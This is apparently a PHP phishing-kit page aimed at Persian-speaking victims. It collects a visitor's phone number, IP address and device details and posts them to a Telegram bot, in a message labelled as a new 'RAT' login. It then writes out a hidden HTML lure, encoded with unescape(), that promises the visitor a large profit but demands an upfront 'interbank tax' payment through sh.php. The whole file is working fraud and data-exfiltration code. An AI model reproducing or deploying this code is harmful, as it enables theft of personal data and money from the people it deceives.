
<?php

include_once 'os.php';
$Phone = $_POST["Phone"];
$ip = $_SERVER['REMOTE_ADDR'];
$Device = rtrim(explode(' ',$_SERVER['HTTP_USER_AGENT'])[4],")");

$msg = "  
🥷ɴᴇᴡ ʟᴏɢɪɴ ʀᴀᴛ ɢᴜʏꜱ
-- - -- - -- - -- - -- - -- - --
📞ᴘʜᴏɴᴇ :
<code>$Phone</code>

🌐ɪᴘ : 
<code>$ip</code>

📱ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ :
<code>$Device</code>
-- - -- - -- - -- - -- - -- - --
@New_DeraGon
";
    $Key = json_encode(['inline_keyboard'=>[
                [['text'=>" ᴅᴇᴠ ", 'url'=>"https://t.me/cardotp"]],
    ]]);
    if (!empty($token) && !empty($id))
    $send = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($msg) . '&parse_mode=HTML' . '&reply_markup=" . $Key . "' ;
    $params = [
'chat_id' => $id,
'reply_markup' => $Key,
'text' => $msg,
'parse_mode' => 'HTML'
];
    $website = "https://api.telegram.org/bot" . $token;
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);


?>

<script>
document.write(unescape('%3Chtml%20lang%3D%22en-US%22%3E%0A%0A%20%20%20%20%3Chead%3E%0A%20%20%20%20%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20maximum-scale%3D1%22%3E%0A%09%09%3Cmeta%20name%3D%27robots%27%20content%3D%27max-image-preview%3Alarge%27%20/%3E%0A%0A%09%3Ctitle%3E%u0627%u0646%u062C%u0627%u0645%20%u062A%u0631%u0627%u06A9%u0646%u0634%3C/title%3E%0A%0A%3C/style%3E%0A%09%3Clink%20rel%3D%27stylesheet%27%20id%3D%27wp-block-library-css%27%20%20href%3D%27style1.min.css%3Fver%3D5.7.8%27%20type%3D%27text/css%27%20media%3D%27all%27%20/%3E%0A%3Clink%20rel%3D%27stylesheet%27%20id%3D%27elementor-icons-ekiticons-css%27%20%20href%3D%27css/ekiticons.css%3Fver%3D5.9.0%27%20type%3D%27text/css%27%20media%3D%27all%27%20/%3E%0A%0A%3Clink%20rel%3D%27stylesheet%27%20id%3D%27hostinza-style-css%27%20%20href%3D%27css/style.css%3Fver%3D1.4.2%27%20type%3D%27text/css%27%20media%3D%27all%27%20/%3E%0A%0A%0A%3C/script%3E%0A%3Cstyle%20id%3D%22sccss%22%3Ebody%7B%0A%09text-align%3A%20end%0A%7D%0A%0A%23field_1_4.gfield%20input%20%7B%0A%20%20%20%20border-radius%3A%205px%3B%0A%7D%20%20%0A%0A%23field_1_6.gfield%20input%20%7B%0A%20%20%20%20border-radius%3A%205px%3B%0A%7D%0A%23field_1_10.gfield%20textarea%20%7B%0A%20%20%20%20border-radius%3A%205px%3B%0A%7D%0A%0A%23gform_1%7B%0A%09direction%3Artl%0A%7D%0A@font-face%20%7B%0A%20%20%20%20font-family%3A%20myFont%3B%0A%20%20%20%20src%3A%20url%28%27fonts/wYekan.ttf%27%29%3B%0A%7D%0Abody%20%7B%0A%20%20%20%20font-family%3A%20myFont%3B%0A%7D%0A.spacer.gfield%7B%0A%09display%3Anone%0A%7D%0A%0Aform.elementor-form%20%7B%0A%20%20%20%20direction%3A%20rtl%3B%0A%7D%0A%0A.elementor-widget-icon-list%20.elementor-widget-container%7Bdirection%3Altr%7D%0A%0A.ts%20.elementor-widget-wrap%7Bdirection%3A%20rtl%7D%3C/style%3E%3Cstyle%20id%3D%22kirki-inline-styles%22%3E.header-transparent%20.xs-top-bar%7Bbackground-color%3Argba%280%2C0%2C0%2C0.25%29%3B%7D.xs-top-bar%7Bbackground-color%3Argba%280%2C0%2C0%2C0.25%29%3B%7Dfooter.xs-footer-section.footer-group%20a%7Bcolor%3A%23d7d7d7%3B%7Dfooter.xs-footer-section.footer-v2%20a%7Bcolor%3A%23d7d7d7%3B%7Dbody%7Bfont-family%3AGeorgia%2CTimes%2C%22Times%20New%20Roman%22%2Cserif%3B%7D%3C/style%3E%20%20%20%20%3C/head%3E%0A%0A%0A%3C/h3%3E%09%09%3C/div%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%3C/div%3E%0A%09%09%09%09%09%09%09%3C/div%3E%0A%09%09%3C/section%3E%0A%09%09%09%09%3Csection%20class%3D%22elementor-section%20elementor-top-section%20elementor-element%20elementor-element-3861e51%20elementor-section-boxed%20elementor-section-height-default%20elementor-section-height-default%22%20data-id%3D%223861e51%22%20data-element_type%3D%22section%22%20data-settings%3D%22%7B%26quot%3Bekit_has_onepagescroll_dot%26quot%3B%3A%26quot%3Byes%26quot%3B%7D%22%3E%0A%09%09%09%09%09%09%3Cdiv%20class%3D%22elementor-container%20elementor-column-gap-default%22%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22elementor-column%20elementor-col-100%20elementor-top-column%20elementor-element%20elementor-element-86a8f4f%22%20data-id%3D%2286a8f4f%22%20data-element_type%3D%22column%22%3E%0A%09%09%09%3Cdiv%20class%3D%22elementor-widget-wrap%20elementor-element-populated%22%3E%0A%09%09%09%09%09%09%09%09%3Cdiv%20class%3D%22elementor-element%20elementor-element-aa44bc5%20elementor-widget%20elementor-widget-xs-call-to-action-box%22%20data-id%3D%22aa44bc5%22%20data-element_type%3D%22widget%22%20data-widget_type%3D%22xs-call-to-action-box.default%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22elementor-widget-container%22%3E%0A%09%09%09%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22xs-feature-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22media%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22feature-img%20d-flex%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20width%3D%22150%22%20height%3D%22150%22%20src%3D%22IMG/lop.png%22%20class%3D%22attachment-thumbnail%20size-thumbnail%22%20alt%3D%22%22%20loading%3D%22lazy%22%20sizes%3D%22%28max-width%3A%20150px%29%20100vw%2C%20150px%22%20/%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22media-body%20feature-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch4%20class%3D%22xs-title%22%3E%u0633%u0648%u062F%20%u0634%u0645%u0627%20%u06F5%u06F8%2C%u06F3%u06F9%u06F1%2C%u06F8%u06F0%u06F0%20%u0631%u06CC%u0627%u0644%3C/h4%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%u0634%u0647%u0631%u0648%u0646%u062F%20%u06AF%u0631%u0627%u0645%u06CC%20%u0633%u0648%u062F%20%u0634%u0645%u0627%20%u0622%u0645%u0627%u062F%u0647%20%u062F%u0631%u06CC%u0627%u0641%u062A%20%u0627%u0633%u062A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%u0627%u0645%u0627%20%u0642%u0628%u0644%20%u0627%u0632%20%u062F%u0631%u06CC%u0627%u0641%u062A%20%u0633%u0648%u062F%20%u0633%u0647%u0627%u0645%20%u0634%u0645%u0627%20%u0628%u0627%u06CC%u062F%20%u0645%u0628%u0644%u063A%20322%2C500%20%u0631%u06CC%u0627%u0644%20%u0628%u0631%u0627%u06CC%20%u0645%u0627%u0644%u06CC%u0627%u062A%20%u062F%u0631%u0648%u0646%20%u0628%u0627%u0646%u06A9%u06CC%20%u067E%u0631%u062F%u0627%u062E%u062A%20%u0646%u0645%u0648%u062F%u0647%20%u0648%20%u0628%u0639%u062F%20%u0627%u0632%20%u067E%u0631%u062F%u0627%u062E%u062A%20%u060C%20%u0633%u0648%u062F%20%u0634%u0645%u0627%20%u062F%u0631%20%u0648%u0642%u062A%20%u0628%u0627%u0646%u06A9%u06CC%20%u060C%20%u0628%u0647%20%u062D%u0633%u0627%u0628%20%u062C%u0627%u0631%u06CC%20%u0645%u0631%u0628%u0648%u0637%u0647%20%u0627%u0631%u0633%u0627%u0644%20%u062E%u0648%u0627%u0647%u062F%20%u0634%u062F%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22xs-btn-wraper%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22sh.php%22%20class%3D%22btn%20btn-secondary%22%3E%u067E%u0631%u062F%u0627%u062E%u062A%20%u0645%u0627%u0644%u06CC%u0627%u062A%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22icon%20icon-dollar%20watermark-icon%22%3E%3C/span%3E%0A%20%09%09%3Cstyle%3E%0A@font-face%20%7B%0A%20%20%20%20font-family%3A%20myFont%3B%0A%20%20%20%20src%3A%20url%28%27Fonts/Shabnam-FD.ttf%27%29%3B%0A%7D%0Abody%20%7B%0A%20%20%20%20font-family%3A%20myFont%3B%0A%7D%0A%3C/style%3E%0A%09%09%09%3C/body%3E%0A%3C/html%3E'))
</script>